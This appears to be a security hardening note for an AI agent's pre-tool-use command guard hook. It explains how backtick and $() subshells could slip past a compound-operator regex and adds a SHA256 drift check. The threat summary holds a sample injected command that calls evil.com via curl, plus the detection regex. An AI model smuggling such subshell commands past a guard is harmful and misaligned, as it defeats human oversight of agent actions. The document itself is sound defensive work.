## (a) Threat model summary

Reference: v0.1.10 hook hardening (D-3) closed semicolon / pipe / `&&` / `||` injection
vectors via `_COMPOUND_OP_RE`. Two residual attack surfaces identified during v0.1.11
PlanAudit (PLANNING dispatch V0.1.11-S1-D2):

- **RAID-SEC-V11-backtick-subshell-injection** (sev: MEDIUM): backtick (`` ` ``) and
  `$()` subshell forms were NOT covered by v0.1.10 `_COMPOUND_OP_RE`. An attacker could
  bypass the compound-operator check by injecting a backtick-quoted or `$(...)`-enclosed
  command after a legitimate daemon label, e.g.:
  `launchctl bootstrap com.teamwork-leader.auto-resume-daemon \`curl evil.com\``
  The v0.1.10 regex would NOT detect this as a compound operator, potentially downgrading
  an injected command to `ask` instead of `deny`.

- **RAID-V11-hook-drift-verification** (sev: LOW): no mechanism existed to detect if
  `~/.claude/hooks/pretooluse_guard.py` had been modified (drifted) after its canonical
  version was shipped. A silently drifted hook could weaken security guarantees without
  operator awareness. AC-6 adds a SessionStart-time SHA256 comparison to emit a warning
  on drift.

## (b) Before / after regex D-3 v2 (AC-4)

**Before** (v0.1.10 D-3, `_COMPOUND_OP_RE`):

```python
_COMPOUND_OP_RE = re.compile(r"[;|]|&&|\|\|")
```

Covered: semicolon (`;`), pipe (`|`), AND-then (`&&`), OR-else (`||`).  
NOT covered: backtick subshell (`` ` ``), dollar-paren subshell (`$(`).

**After** (v0.1.11 AC-4, `_COMPOUND_OP_RE` D-3 v2):

```python
_COMPOUND_OP_RE = re.compile(r"[;|`]|&&|\|\||\$\(")
```

Now also covers:
- `` ` `` — backtick subshell injection
- `$(` — dollar-paren subshell injection

Comment updated to document v0.1.11 extension explicitly. No other changes to the
compound-operator guard logic or the `_is_teamlead_launchctl` structure.

## (c) SHA256 drift check mechanism (AC-6)

### §hook-integrity

Canonical SHA256 of `~/.claude/hooks/pretooluse_guard.py` after AC-4 regex extension:

```
sha256: 8757700a1c62c2ea077238e60f9b54722022dd32610ec0c0e8e804a4df7bc9d4
```

This hash is parsed by `hooks/session-start.py` at SessionStart time. If the live hook's
SHA256 does not match the value on the `sha256: ` line in this file, a one-line warning
is emitted to stderr. The check is **warn-only** — no blocking, no abort — per Plan A
(AC-6 design: operator awareness, not hard gate).

### Implementation in `hooks/session-start.py`

Added `_check_hook_integrity()` function called from `_path_armed()` and
`_detect_and_route()` entry (before main routing). Logic:

1. Locate this evidence file at `docs/security/v0.1.11-hook-hardening.md` relative to
   `_plugin_root()`.
2. Parse first line matching `^sha256: ([0-9a-f]{64})$`.
3. If evidence file absent or no `sha256:` line: silent skip (handles first-install before
   v0.1.11 evidence is committed).
4. Compute SHA256 of `~/.claude/hooks/pretooluse_guard.py` via existing `_sha256_file()`.
5. If live hook absent: silent skip.
6. If digests differ: `sys.stderr.write(...)` warning with both hashes; continue normally.
7. If digests match: silent (no output).
